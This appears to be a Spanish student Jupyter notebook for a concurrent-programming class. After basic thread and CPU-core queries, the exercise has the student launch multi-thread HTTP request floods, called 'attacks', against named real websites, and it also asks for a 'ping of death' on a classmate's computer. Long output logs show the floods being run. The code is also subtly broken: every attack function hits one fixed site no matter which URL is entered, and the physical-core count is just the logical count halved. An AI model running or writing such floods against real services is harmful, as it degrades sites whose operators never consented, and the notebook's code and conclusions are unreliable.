# %% [markdown]
# # AI1
#
# ## Enunciado
#
# * 1.- Crear plantilla y portada para todos los ejercicios que realizaremos a lo largo del curso.
# * 2.- Cree un programa para determinar :
# * 3.- El numero de proceso que lo maneja y cuantos "procesos" (hilos) estan activos
# * 4.- Cuantos hilos activos tienen lanzados en este momento ?
# * 5.- Cuántos cores lógicos tiene su equipo ?
# * 6.- Cuántos cores fisicos tiene su equipo ?
# * 7.-Enumere e identifique los hilos lanzados ?
# * 8.-Lance un ataque usando 20 hilos a: https://github.com/sukuzhanay
# * 9.-Lance un ataque de 30 hilos a    : https://www.youtube.com/channel/UCEXbXdeafAjBahYK2hoQJFg
# * 10.- Lance un ataque de 50 hilos a  : https://rpubs.com/christian_sucuzhanay
# * 11.- Lance ataque de 100 hilos a : https://rpubs.com/christian_sucuzhanay
# * 12.- Lance un ataque de 200 hilos a : https://www.kaggle.com/sukuzhanay
# * 13.- Lance un ataque de 300 hilos a : https://stackoverflow.com/story/christian-sucuzhanay-arevalo
# * 14.- Lance un ataque de 400 hilos a : https://eburnout.com/
# * 15.- Que paginas logro "tumbar"
# * 16.- Lance 20 hilos con el ping de la muerte al equipo de su compañero ( a elegir )

# %% [markdown]
# * 1.- Crear plantilla y portada para todos los ejercicios que realizaremos a lo largo del curso

# %% [markdown]
# <h1 style = "text-align:center; font-size: 36px">Programación Concurrente y Distribuida </h1>
# <a href="https://github.com/miguelwang125">
#     <img src="1607514944791.jpg"  title = "Jinghao Wang 21912599" alt="Jinghao Wang" width="100" height="100" style="float:left;vertical-alig:middle">
#     <img src="UEM.png" title= "M22"alt="UE" width="105" height="105" style="float:right;vertical-alig:middle">

# %% [markdown]
# * 2.- Cree un programa para determinar :

# %%
import requests
import os
import threading

# %% [markdown]
# * 3.- El numero de proceso que lo maneja y cuantos "procesos" (hilos) estan activos

# %%
print("El proceso que esta manejando este prog. es :", os.getpid())
# Out:
# El proceso que esta manejando este prog. es : 12396

# %%
print("Procesos activos en este momento de la ejecución( hilos )= -->", threading.activeCount())
# Out:
# Procesos activos en este momento de la ejecución( hilos )= --> 5

# %% [markdown]
# * 4.- Cuantos hilos activos tienen lanzados en este momento ?

# %%
print("Hilos activos en este momento de la ejecución")
# Out:
# Hilos activos en este momento de la ejecución

# %% [markdown]
# * 5.- Cuántos cores lógicos tiene su equipo ?

# %%
print("Éste equipo tiene", os.cpu_count(), "Cores lógicos")
# Out:
# Éste equipo tiene 12 Cores lógicos

# %% [markdown]
# * 6.- Cuántos cores fisicos tiene su equipo ?

# %%
print("Éste equipo tiene", os.cpu_count()/2, "Cores fisicos")
# Out:
# Éste equipo tiene 6.0 Cores fisicos

# %% [markdown]
# * 7.-Enumere e identifique los hilos lanzados ?

# %%
threading.enumerate()
# Out:
# [<_MainThread(MainThread, started 12972)>,
#  <Thread(Thread-4, started daemon 27948)>,
#  <Heartbeat(Thread-5, started daemon 28436)>,
#  <HistorySavingThread(IPythonHistorySavingThread, started 8916)>,
#  <ParentPollerWindows(Thread-3, started daemon 5600)>]

# %% [markdown]
# Tenemos un hilo principal, T2 que es demonio, el hilo tres es el que está determinando si el sistema sigue funcionando y que también es demonio, el cuarto nos hace el seguimiento del historial cuando grabamos, es usado por JupiterLab y tambien es demonio y Finalmente tenemos un hilo padre que también es demonio.

# %% [markdown]
# * 8.-Lance un ataque usando 20 hilos a: https://github.com/sukuzhanay

# %% [markdown]
# Para lanzar el ataque requiero de la librería Requests que le importo en el punto 2.

# %% [markdown]
# Crea una función para realizar los ataques

# %%
def ataqueGithub():
    print(requests.get('https://eburnout.com/'))
    print("Lanzado el hilo con identificador", threading.current_thread().getName())

# %% [markdown]
# Creo una función para preguntar el número de hilos a utilizar y la dirección a donde quiere atacar

# %%
num_hilos=int(input("Dígame el número de hilos"))
# Out:
# Dígame el número de hilos 20

# %%
web=input("Dígame a dirección web correctamente formateada")
# Out:
# Dígame a dirección web correctamente formateada https://github.com/sukuzhanay

# %%
print('\nAtaque usando,', num_hilos)
# Out:
# Ataque usando, 20

# %%
for i in range(num_hilos):
    threading.Thread(target=ataqueGithub).start()
# Out:
# <Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-1149
#
# Lanzado el hilo con identificador Thread-1147
# <Response [200]>
# Lanzado el hilo con identificador Thread-1148
# <Response [200]>
# Lanzado el hilo con identificador Thread-1146
# <Response [200]>
# Lanzado el hilo con identificador Thread-1150
# <Response [200]>
# Lanzado el hilo con identificador Thread-1151
# <Response [200]>
# Lanzado el hilo con identificador Thread-1156
# <Response [200]>
# Lanzado el hilo con identificador <Response [200]>
# Lanzado el hilo con identificador Thread-1152
# Thread-1154
# <Response [200]>
# Lanzado el hilo con identificador Thread-1160<Response [200]>
# Lanzado el hilo con identificador
# Thread-1153<Response [200]>
# Lanzado el hilo con identificador Thread-1157
# <Response [200]>
# Lanzado el hilo con identificador Thread-1165
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1163
# <Response [200]>
# Lanzado el hilo con identificador Thread-1161
# <Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-1158
# <Response [200]>
# Lanzado el hilo con identificador Thread-1159
#
# Lanzado el hilo con identificador<Response [200]>
# Lanzado el hilo con identificador  Thread-1155
# Thread-1162
# <Response [200]>
# Lanzado el hilo con identificador Thread-1164

# %%
def ataqueYoutube():
    print(requests.get('https://eburnout.com/'))
    print("Lanzado el hilo con identificador", threading.current_thread().getName())

# %%
num_hilos=int(input("Dígame el número de hilos"))
# Out:
# Dígame el número de hilos 30

# %%
web=input("Dígame a dirección web correctamente formateada")
# Out:
# Dígame a dirección web correctamente formateada https://www.youtube.com/channel/UCEXbXdeafAjBahYK2hoQJFg

# %%
print('\nAtaque usando,', num_hilos)
# Out:
# Ataque usando, 30

# %%
for i in range(num_hilos):
    threading.Thread(target=ataqueYoutube).start()
# Out:
# <Response [200]>
# Lanzado el hilo con identificador <Response [200]>
# Lanzado el hilo con identificador Thread-1167
# <Response [200]>
# Lanzado el hilo con identificador Thread-1173
# Thread-1170
# <Response [200]>
# Lanzado el hilo con identificador Thread-1166
# <Response [200]>
# Lanzado el hilo con identificador Thread-1174
# <Response [200]>
# Lanzado el hilo con identificador Thread-1168<Response [200]>
# Lanzado el hilo con identificador Thread-1172
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1171
# <Response [200]>
# Lanzado el hilo con identificador Thread-1169<Response [200]>
# Lanzado el hilo con identificador Thread-1178
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1175
# <Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-1180
# <Response [200]>
# Lanzado el hilo con identificador Thread-1179
# <Response [200]>
# Lanzado el hilo con identificador Thread-1182<Response [200]>
# Lanzado el hilo con identificador Thread-1176
#
# <Response [200]>
# Lanzado el hilo con identificador <Response [200]>
# Lanzado el hilo con identificador Thread-1181
# Lanzado el hilo con identificador Thread-1177Thread-1183
#
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1187
# <Response [200]>
# Lanzado el hilo con identificador Thread-1184
# <Response [200]>
# Lanzado el hilo con identificador Thread-1185
# <Response [200]>
# Lanzado el hilo con identificador Thread-1190
# <Response [200]>
# Lanzado el hilo con identificador Thread-1189
# <Response [200]>
# Lanzado el hilo con identificador Thread-1192
# <Response [200]>
# Lanzado el hilo con identificador<Response [200]>
# Lanzado el hilo con identificador Thread-1193
#  <Response [200]>
# Lanzado el hilo con identificador Thread-1191
# Thread-1188
# <Response [200]>
# Lanzado el hilo con identificador Thread-1186
# <Response [200]>
# Lanzado el hilo con identificador Thread-1195
# <Response [200]>
# Lanzado el hilo con identificador Thread-1194

# %%
def ataqueRpubs():
    print(requests.get('https://eburnout.com/'))
    print("Lanzado el hilo con identificador", threading.current_thread().getName())

# %%
num_hilos=int(input("Dígame el número de hilos"))
# Out:
# Dígame el número de hilos 50

# %%
web=input("Dígame a dirección web correctamente formateada")
# Out:
# Dígame a dirección web correctamente formateada https://rpubs.com/christian_sucuzhanay

# %%
print('\nAtaque usando,', num_hilos)
# Out:
# Ataque usando, 50

# %%
for i in range(num_hilos):
    threading.Thread(target=ataqueRpubs).start()
# Out:
# <Response [200]>
# Lanzado el hilo con identificador Thread-1198
# <Response [200]>
# Lanzado el hilo con identificador Thread-1197
# <Response [200]>
# Lanzado el hilo con identificador Thread-1202
# <Response [200]>
# Lanzado el hilo con identificador Thread-1207
# <Response [200]>
# Lanzado el hilo con identificador Thread-1200
# <Response [200]>
# Lanzado el hilo con identificador Thread-1211
# <Response [200]>
# Lanzado el hilo con identificador Thread-1196
# <Response [200]>
# Lanzado el hilo con identificador Thread-1203
# <Response [200]>
# Lanzado el hilo con identificador Thread-1206
# <Response [200]>
# Lanzado el hilo con identificador Thread-1204
# <Response [200]>
# Lanzado el hilo con identificador Thread-1199
# <Response [200]>
# Lanzado el hilo con identificador Thread-1201
# <Response [200]>
# Lanzado el hilo con identificador Thread-1208
# <Response [200]>
# Lanzado el hilo con identificador Thread-1205
# <Response [200]>
# Lanzado el hilo con identificador Thread-1209
# <Response [200]>
# Lanzado el hilo con identificador Thread-1210
# <Response [200]>
# Lanzado el hilo con identificador Thread-1213
# <Response [200]>
# Lanzado el hilo con identificador Thread-1212
# <Response [200]>
# <Response [200]>
# Lanzado el hilo con identificador Thread-1214
# Lanzado el hilo con identificador Thread-1228
# <Response [200]>
# Lanzado el hilo con identificador <Response [200]>
# Lanzado el hilo con identificador Thread-1215
# <Response [200]>
# Lanzado el hilo con identificador Thread-1223
# Thread-1217
# <Response [200]>
# Lanzado el hilo con identificador <Response [200]>
# Lanzado el hilo con identificador Thread-1229<Response [200]>
# Lanzado el hilo con identificador Thread-1237
# <Response [200]>
# Lanzado el hilo con identificador Thread-1231
# <Response [200]>
# Lanzado el hilo con identificador Thread-1225
# <Response [200]>
# Lanzado el hilo con identificador Thread-1240
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1219
# <Response [200]>
# Lanzado el hilo con identificador Thread-1218<Response [200]>
# Lanzado el hilo con identificador Thread-1216
# <Response [200]>
# Lanzado el hilo con identificador Thread-1235
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1241
# <Response [200]>
# Lanzado el hilo con identificador Thread-1222
# <Response [200]>
# Lanzado el hilo con identificador Thread-1227<Response [200]>
# Lanzado el hilo con identificador <Response [200]>
# Lanzado el hilo con identificador Thread-1234
# Thread-1238
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1236
# Thread-1220
# <Response [200]>
# Lanzado el hilo con identificador Thread-1221
# <Response [200]>
# Lanzado el hilo con identificador Thread-1230
# <Response [200]>
# Lanzado el hilo con identificador <Response [200]>
# Lanzado el hilo con identificador Thread-1244
# <Response [200]>
# Lanzado el hilo con identificador Thread-1224
# <Response [200]>
# Lanzado el hilo con identificador Thread-1239
# Thread-1242
# <Response [200]>
# Lanzado el hilo con identificador Thread-1243
# <Response [200]>
# Lanzado el hilo con identificador Thread-1232
# <Response [200]>
# Lanzado el hilo con identificador Thread-1233
# <Response [200]>
# Lanzado el hilo con identificador Thread-1226
# <Response [200]>
# Lanzado el hilo con identificador Thread-1245

# %%
def ataqueRpubs2():
    print(requests.get('https://eburnout.com/'))
    print("Lanzado el hilo con identificador", threading.current_thread().getName())

# %%
num_hilos=int(input("Dígame el número de hilos"))
# Out:
# Dígame el número de hilos 100

# %%
web=input("Dígame a dirección web correctamente formateada")
# Out:
# Dígame a dirección web correctamente formateada https://rpubs.com/christian_sucuzhanay

# %%
print('\nAtaque usando,', num_hilos)
# Out:
# Ataque usando, 100

# %%
for i in range(num_hilos):
    threading.Thread(target=ataqueRpubs2).start()
# Out:
# <Response [200]>
# Lanzado el hilo con identificador Thread-1250
# <Response [200]>
# Lanzado el hilo con identificador Thread-1251
# <Response [200]>
# Lanzado el hilo con identificador Thread-1247
# <Response [200]>
# Lanzado el hilo con identificador Thread-1249
# <Response [200]>
# Lanzado el hilo con identificador Thread-1246
# <Response [200]>
# Lanzado el hilo con identificador Thread-1248
# <Response [200]>
# Lanzado el hilo con identificador Thread-1253
# <Response [200]>
# Lanzado el hilo con identificador Thread-1254
# <Response [200]>
# Lanzado el hilo con identificador Thread-1256
# <Response [200]>
# Lanzado el hilo con identificador Thread-1257
# <Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-1252
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1263
# Lanzado el hilo con identificador<Response [200]>
# Lanzado el hilo con identificador <Response [200]>
# Lanzado el hilo con identificador Thread-1262Thread-1261
# <Response [200]>
# Lanzado el hilo con identificador Thread-1255
#  Thread-1258
# <Response [200]>
# Lanzado el hilo con identificador Thread-1259<Response [200]>
# Lanzado el hilo con identificador Thread-1260
# <Response [200]>
# Lanzado el hilo con identificador Thread-1264
# <Response [200]>
# Lanzado el hilo con identificador Thread-1266
# <Response [200]>
# Lanzado el hilo con identificador Thread-1265
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1272
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1278
# <Response [200]>
# <Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-1270Lanzado el hilo con identificador Thread-1271
#
# Lanzado el hilo con identificador<Response [200]>
# Lanzado el hilo con identificador Thread-1267<Response [200]>
# Lanzado el hilo con identificador Thread-1268
#  <Response [200]>
# Lanzado el hilo con identificador Thread-1273
# <Response [200]>
# Lanzado el hilo con identificador Thread-1276Thread-1277
#
#
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1282
# <Response [200]>
# Lanzado el hilo con identificador Thread-1269<Response [200]>
# Lanzado el hilo con identificador Thread-1275
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1279
# <Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-1284
#
# Lanzado el hilo con identificador Thread-1283
# <Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-1280
# Lanzado el hilo con identificador
# <Response [200]>
# Lanzado el hilo con identificador Thread-1281
#  Thread-1274
# <Response [200]>
# Lanzado el hilo con identificador Thread-1286
# <Response [200]>
# Lanzado el hilo con identificador Thread-1285
# <Response [200]>
# Lanzado el hilo con identificador Thread-1289
# <Response [200]>
# <Response [200]>Lanzado el hilo con identificador
#  Thread-1290
# Lanzado el hilo con identificador Thread-1291
# <Response [200]>
# Lanzado el hilo con identificador Thread-1287
# <Response [200]>
# Lanzado el hilo con identificador <Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-1294
# Thread-1288
#
# Lanzado el hilo con identificador Thread-1293
# <Response [200]>
# Lanzado el hilo con identificador <Response [200]>
# Lanzado el hilo con identificador Thread-1300
# <Response [200]>
# Lanzado el hilo con identificador Thread-1296
# <Response [200]>
# Lanzado el hilo con identificador Thread-1295
# <Response [200]>
# Lanzado el hilo con identificador Thread-1301
# Thread-1292<Response [200]>
# Lanzado el hilo con identificador
# Thread-1302
# <Response [200]>
# Lanzado el hilo con identificador Thread-1299
# <Response [200]>
# Lanzado el hilo con identificador Thread-1298
# <Response [200]>
# Lanzado el hilo con identificador <Response [200]>
# Lanzado el hilo con identificador Thread-1303<Response [200]>
# Lanzado el hilo con identificador
# Thread-1305
# Thread-1297
# <Response [200]>
# Lanzado el hilo con identificador Thread-1306
# <Response [200]>
# Lanzado el hilo con identificador Thread-1304
# <Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-1309
#
# Lanzado el hilo con identificador Thread-1308
# <Response [200]>
# Lanzado el hilo con identificador Thread-1307
# <Response [200]>
# Lanzado el hilo con identificador Thread-1310<Response [200]>
# Lanzado el hilo con identificador Thread-1313
# <Response [200]>
# Lanzado el hilo con identificador Thread-1311
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1312
# <Response [200]>
# Lanzado el hilo con identificador Thread-1314
# <Response [200]>
# Lanzado el hilo con identificador Thread-1315
# <Response [200]>
# Lanzado el hilo con identificador <Response [200]>
# Lanzado el hilo con identificador Thread-1316
# Thread-1317
# <Response [200]>
# Lanzado el hilo con identificador Thread-1318
# <Response [200]>
# <Response [200]>
# Lanzado el hilo con identificador Thread-1320
# Lanzado el hilo con identificador Thread-1323<Response [200]>
# Lanzado el hilo con identificador Thread-1321
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1322
# <Response [200]>
# Lanzado el hilo con identificador Thread-1319
# <Response [200]>
# Lanzado el hilo con identificador Thread-1327
# <Response [200]>
# Lanzado el hilo con identificador Thread-1324
# <Response [200]>
# Lanzado el hilo con identificador Thread-1329
# <Response [200]>
# Lanzado el hilo con identificador Thread-1332
# <Response [200]>
# Lanzado el hilo con identificador Thread-1326
# <Response [200]>
# Lanzado el hilo con identificador Thread-1325
# <Response [200]>
# Lanzado el hilo con identificador Thread-1330
# <Response [200]>
# Lanzado el hilo con identificador Thread-1331
# <Response [200]>
# <Response [200]>
# Lanzado el hilo con identificador Thread-1328
# Lanzado el hilo con identificador Thread-1333
# <Response [200]>
# Lanzado el hilo con identificador Thread-1334
# <Response [200]>
# Lanzado el hilo con identificador Thread-1335<Response [200]>
# Lanzado el hilo con identificador Thread-1336
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1337
# <Response [200]>
# Lanzado el hilo con identificador Thread-1338
# <Response [200]>
# Lanzado el hilo con identificador Thread-1341
# <Response [200]>
# Lanzado el hilo con identificador Thread-1339
# <Response [200]>
# Lanzado el hilo con identificador <Response [200]>
# Lanzado el hilo con identificador Thread-1345
# <Response [200]>
# Lanzado el hilo con identificador Thread-1342
# Thread-1340
# <Response [200]>
# Lanzado el hilo con identificador Thread-1344
# <Response [200]>
# Lanzado el hilo con identificador Thread-1343

# %%
def ataqueKaggle():
    print(requests.get('https://eburnout.com/'))
    print("Lanzado el hilo con identificador", threading.current_thread().getName())

# %%
num_hilos=int(input("Dígame el número de hilos"))
# Out:
# Dígame el número de hilos 200

# %%
web=input("Dígame a dirección web correctamente formateada")
# Out:
# Dígame a dirección web correctamente formateada https://www.kaggle.com/sukuzhanay

# %%
print('\nAtaque usando,', num_hilos)
# Out:
# Ataque usando, 200

# %%
for i in range(num_hilos):
    threading.Thread(target=ataqueKaggle).start()
# Out:
# <Response [200]>
# Lanzado el hilo con identificador Thread-1349
# <Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-1348
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1350
# Lanzado el hilo con identificador<Response [200]>
# Lanzado el hilo con identificador Thread-1352
# <Response [200]>
# Lanzado el hilo con identificador Thread-1357
# <Response [200]>
# Lanzado el hilo con identificador Thread-1353
# <Response [200]>
# Lanzado el hilo con identificador Thread-1347
# <Response [200]>
# Lanzado el hilo con identificador Thread-1351
# Thread-1346
# <Response [200]>
# Lanzado el hilo con identificador Thread-1354
# <Response [200]>
# Lanzado el hilo con identificador Thread-1355
# <Response [200]>
# Lanzado el hilo con identificador Thread-1359
# <Response [200]>
# Lanzado el hilo con identificador Thread-1360<Response [200]>
# Lanzado el hilo con identificador Thread-1358
# <Response [200]>
# Lanzado el hilo con identificador Thread-1362
#
# <Response [200]>
# <Response [200]>
# Lanzado el hilo con identificador Thread-1364
# Lanzado el hilo con identificador Thread-1361
# <Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-1368<Response [200]>
# Lanzado el hilo con identificador <Response [200]>
# Lanzado el hilo con identificador Thread-1367
#
#
# Thread-1365Lanzado el hilo con identificador Thread-1356
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1366
# <Response [200]>
# Lanzado el hilo con identificador Thread-1371
# <Response [200]>
# Lanzado el hilo con identificador Thread-1363
# <Response [200]>
# Lanzado el hilo con identificador<Response [200]>
# Lanzado el hilo con identificador Thread-1370
# Thread-1369
# <Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-1374
#
# Lanzado el hilo con identificador Thread-1372
# <Response [200]>
# Lanzado el hilo con identificador Thread-1375
# <Response [200]>
# Lanzado el hilo con identificador Thread-1373
# <Response [200]>
# Lanzado el hilo con identificador Thread-1382
# <Response [200]>
# Lanzado el hilo con identificador Thread-1378
# <Response [200]>
# Lanzado el hilo con identificador Thread-1379
# <Response [200]>
# Lanzado el hilo con identificador Thread-1377
# <Response [200]>
# Lanzado el hilo con identificador Thread-1376
# <Response [200]>
# Lanzado el hilo con identificador Thread-1381
# <Response [200]>
# Lanzado el hilo con identificador Thread-1383
# <Response [200]>
# Lanzado el hilo con identificador Thread-1385<Response [200]>
# Lanzado el hilo con identificador Thread-1384
# <Response [200]>
# Lanzado el hilo con identificador
# Thread-1387<Response [200]>
# Lanzado el hilo con identificador Thread-1380<Response [200]>
# Lanzado el hilo con identificador Thread-1386
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1389
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1391
# <Response [200]>
# Lanzado el hilo con identificador Thread-1392
# <Response [200]>
# Lanzado el hilo con identificador <Response [200]>Thread-1388
#
# Lanzado el hilo con identificador<Response [200]>
# Lanzado el hilo con identificador Thread-1394
#  Thread-1390
# <Response [200]>
# Lanzado el hilo con identificador Thread-1393
# <Response [200]>
# Lanzado el hilo con identificador Thread-1396
# <Response [200]>
# Lanzado el hilo con identificador Thread-1395
# <Response [200]>
# Lanzado el hilo con identificador Thread-1398
# <Response [200]>
# Lanzado el hilo con identificador Thread-1399
# <Response [200]>
# <Response [200]>
# Lanzado el hilo con identificador Thread-1400
# Lanzado el hilo con identificador Thread-1397
# <Response [200]>
# Lanzado el hilo con identificador Thread-1401
# <Response [200]>
# Lanzado el hilo con identificador Thread-1403
# <Response [200]>
# Lanzado el hilo con identificador Thread-1402
# <Response [200]>
# Lanzado el hilo con identificador Thread-1406
# <Response [200]>
# Lanzado el hilo con identificador Thread-1404
# <Response [200]>
# Lanzado el hilo con identificador Thread-1407<Response [200]>
# Lanzado el hilo con identificador Thread-1408<Response [200]>
# Lanzado el hilo con identificador Thread-1410
# <Response [200]>
# Lanzado el hilo con identificador
# Thread-1405
# <Response [200]>
# Lanzado el hilo con identificador Thread-1409
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1412
# <Response [200]>
# Lanzado el hilo con identificador Thread-1414
# <Response [200]>
# Lanzado el hilo con identificador Thread-1411
# <Response [200]>
# Lanzado el hilo con identificador Thread-1415
# <Response [200]>
# Lanzado el hilo con identificador Thread-1413
# <Response [200]>
# Lanzado el hilo con identificador Thread-1419
# <Response [200]>
# Lanzado el hilo con identificador Thread-1418
# <Response [200]>
# Lanzado el hilo con identificador Thread-1416
# <Response [200]>
# Lanzado el hilo con identificador Thread-1417
# <Response [200]>
# Lanzado el hilo con identificador Thread-1421
# <Response [200]>
# Lanzado el hilo con identificador Thread-1422
# <Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-1436
# <Response [200]>
# Lanzado el hilo con identificador Thread-1424<Response [200]>
# Lanzado el hilo con identificador Thread-1431
# Lanzado el hilo con identificador Thread-1426
# <Response [200]>
# Lanzado el hilo con identificador Thread-1437
#
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1439<Response [200]>
# Lanzado el hilo con identificador Thread-1446<Response [200]>
# Lanzado el hilo con identificador Thread-1443<Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-1440<Response [200]>
# Lanzado el hilo con identificador
#
# Lanzado el hilo con identificador Thread-1434
# Thread-1430<Response [200]>
# Lanzado el hilo con identificador Thread-1429
# <Response [200]>
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1423
# <Response [200]>
# Lanzado el hilo con identificador <Response [200]>
# Lanzado el hilo con identificador Thread-1450
# <Response [200]>
# Lanzado el hilo con identificador Thread-1449
#
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1425<Response [200]>
# Lanzado el hilo con identificador Thread-1442
# <Response [200]>
# Lanzado el hilo con identificador Thread-1448
# <Response [200]>
# Lanzado el hilo con identificador Thread-1445<Response [200]>
# Lanzado el hilo con identificador Thread-1441<Response [200]>
# Lanzado el hilo con identificador Thread-1435<Response [200]>
# Lanzado el hilo con identificador Thread-1438
# <Response [200]>
# Lanzado el hilo con identificador Thread-1420
# Thread-1447
# Lanzado el hilo con identificador
# <Response [200]>
# Lanzado el hilo con identificador Thread-1427
# <Response [200]>
# Lanzado el hilo con identificador Thread-1452
#
#
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1451
#  <Response [200]>
# Lanzado el hilo con identificador Thread-1428
# <Response [200]>
# Lanzado el hilo con identificador Thread-1432
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1454Thread-1433<Response [200]>
# Lanzado el hilo con identificador
#
# Thread-1455<Response [200]>
# Lanzado el hilo con identificador Thread-1453
# <Response [200]>
# Lanzado el hilo con identificador Thread-1444
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1457
# <Response [200]>
# Lanzado el hilo con identificador Thread-1458
# <Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-1461<Response [200]>
#
# Lanzado el hilo con identificador
# Lanzado el hilo con identificador Thread-1456<Response [200]>Thread-1460
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1464Lanzado el hilo con identificador
#
#  Thread-1459
# <Response [200]>
# Lanzado el hilo con identificador Thread-1462
# <Response [200]>
# Lanzado el hilo con identificador Thread-1463
# <Response [200]>
# Lanzado el hilo con identificador Thread-1465
# <Response [200]>
# Lanzado el hilo con identificador Thread-1468
# <Response [200]>
# Lanzado el hilo con identificador<Response [200]>
# <Response [200]> <Response [200]>
# Lanzado el hilo con identificador Thread-1467Thread-1466<Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-1470
# Lanzado el hilo con identificador
#
#
#
#  <Response [200]>
# Lanzado el hilo con identificador Lanzado el hilo con identificadorLanzado el hilo con identificador<Response [200]>Thread-1476 <Response [200]>
# Lanzado el hilo con identificador Thread-1474
#
#
#  Thread-1469Lanzado el hilo con identificadorThread-1478Thread-1477
#
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1473
# <Response [200]>
# Lanzado el hilo con identificador Thread-1475<Response [200]>
# Lanzado el hilo con identificador Thread-1472Thread-1471
#
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1479
# <Response [200]>
# Lanzado el hilo con identificador Thread-1482
# <Response [200]>
# <Response [200]>Lanzado el hilo con identificador<Response [200]>
#
# Thread-1484Lanzado el hilo con identificadorLanzado el hilo con identificador
#  <Response [200]><Response [200]>
# Lanzado el hilo con identificador  Thread-1480Thread-1481Thread-1486
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1483
#
# Lanzado el hilo con identificador
#  Thread-1485
# <Response [200]>
# Lanzado el hilo con identificador Thread-1488
# <Response [200]>
# Lanzado el hilo con identificador Thread-1490
# <Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-1487
# <Response [200]>
# Lanzado el hilo con identificador Thread-1492
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1491
# Lanzado el hilo con identificador Thread-1489
# <Response [200]>
# <Response [200]>
# Lanzado el hilo con identificador Thread-1496
# Lanzado el hilo con identificador <Response [200]>
# Lanzado el hilo con identificador Thread-1494
# Thread-1493<Response [200]>
# Lanzado el hilo con identificador Thread-1495
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1497
# <Response [200]>
# Lanzado el hilo con identificador Thread-1499
# <Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-1501<Response [200]>
# Lanzado el hilo con identificador
#
# Thread-1503Lanzado el hilo con identificador Thread-1498
#
# <Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-1502
# Lanzado el hilo con identificador Thread-1500
#
# <Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-1504
# <Response [200]>
# Lanzado el hilo con identificador
# Lanzado el hilo con identificadorThread-1508 <Response [200]>
# <Response [200]>
# Lanzado el hilo con identificador
# <Response [200]>
# Lanzado el hilo con identificador Thread-1505
# Thread-1512<Response [200]>
# Lanzado el hilo con identificador <Response [200]>
# Lanzado el hilo con identificador Thread-1510Thread-1506Thread-1507
#
# Lanzado el hilo con identificador
#
# <Response [200]> Thread-1513
# <Response [200]>
# Lanzado el hilo con identificador Thread-1511
#
# Lanzado el hilo con identificador <Response [200]>Thread-1509
#
# Lanzado el hilo con identificador Thread-1518
# <Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-1514
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1517
# <Response [200]>
# Lanzado el hilo con identificador <Response [200]>
# Lanzado el hilo con identificador Thread-1520Thread-1516<Response [200]>
# Lanzado el hilo con identificador Thread-1519
#
# Lanzado el hilo con identificador<Response [200]>
# Lanzado el hilo con identificador Thread-1522
#  Thread-1515
# <Response [200]>
# Lanzado el hilo con identificador Thread-1521
#
# <Response [200]>
# Lanzado el hilo con identificador Thread-1523
# <Response [200]>
# Lanzado el hilo con identificador Thread-1524
# <Response [200]>
# Lanzado el hilo con identificador Thread-1527
# <Response [200]>
# Lanzado el hilo con identificador Thread-1525
# <Response [200]>
# Lanzado el hilo con identificador Thread-1528
# <Response [200]>
# Lanzado el hilo con identificador Thread-1526<Response [200]>
# Lanzado el hilo con identificador Thread-1530
#
# <Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-1532
#
# Lanzado el hilo con identificador Thread-1531
# <Response [200]>
# Lanzado el hilo con identificador Thread-1533
# <Response [200]><Response [200]>
# Lanzado el hilo con identificador Thread-1529
#
# Lanzado el hilo con identificador Thread-1534
# <Response [200]>
# Lanzado el hilo con identificador Thread-1536
# <Response [200]>
# Lanzado el hilo con identificador Thread-1535
# <Response [200]>
# Lanzado el hilo con identificador Thread-1537
# <Response [200]>
# Lanzado el hilo con identificador Thread-1542
# <Response [200]>
# Lanzado el hilo con identificador Thread-1543
# <Response [200]>
# Lanzado el hilo con identificador Thread-1540
# <Response [200]>
